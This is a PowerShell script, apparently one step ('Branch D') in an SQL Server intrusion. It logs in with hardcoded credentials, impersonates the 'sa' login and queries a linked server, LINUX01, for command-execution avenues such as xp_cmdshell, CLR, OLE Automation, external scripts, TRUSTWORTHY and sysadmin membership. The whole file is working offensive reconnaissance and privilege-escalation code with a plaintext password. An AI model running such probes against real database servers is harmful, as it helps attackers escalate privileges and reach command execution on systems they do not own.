# Branch D: probe linux01 exec surfaces (CLR, external script, edition)
$ErrorActionPreference = "Continue"
Add-Type -AssemblyName System.Data
$connStr = "Server=192.168.77.22;Database=master;Integrated Security=false;User ID=analyst_t1;Password=T13r_An@lyst!;TrustServerCertificate=True;"
$conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
$conn.Open()

function Invoke-Reader($sql) {
  $c = $conn.CreateCommand()
  $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
  $r = $c.ExecuteReader()
  while ($r.Read()) { for ($i=0; $i -lt $r.FieldCount; $i++) { if (-not $r.IsDBNull($i)) { Write-Output $r.GetValue($i) } } }
  $r.Close()
}

Write-Output "=== linux01 SQL edition ==="
try { Invoke-Reader "EXEC ('SELECT SERVERPROPERTY(''Edition'') AS edition, SERVERPROPERTY(''ProductVersion'') AS ver') AT LINUX01;" } catch { Write-Output "edition err: $($_.Exception.Message)" }

Write-Output "=== exec-relevant configs on linux01 ==="
try {
  Invoke-Reader "EXEC ('SELECT name, value_in_use FROM sys.configurations WHERE name IN (''xp_cmdshell'',''clr enabled'',''clr strict security'',''Ole Automation Procedures'',''external scripts enabled'')') AT LINUX01;"
} catch { Write-Output "cfg err: $($_.Exception.Message)" }

Write-Output "=== TRUSTWORTHY on master? ==="
try { Invoke-Reader "EXEC ('SELECT name, is_trustworthy_on FROM sys.databases WHERE name = ''master''') AT LINUX01;" } catch { Write-Output "tw err: $($_.Exception.Message)" }

Write-Output "=== SQL login context on linux01 (who can we impersonate) ==="
try { Invoke-Reader "EXEC ('SELECT SUSER_SNAME() AS s, IS_SRVROLEMEMBER(''sysadmin'') AS sa, ORIGINAL_LOGIN() AS orig') AT LINUX01;" } catch { Write-Output "ctx err: $($_.Exception.Message)" }

$conn.Close()
Write-Output "=== BRANCHD_SURFACE_DONE ==="
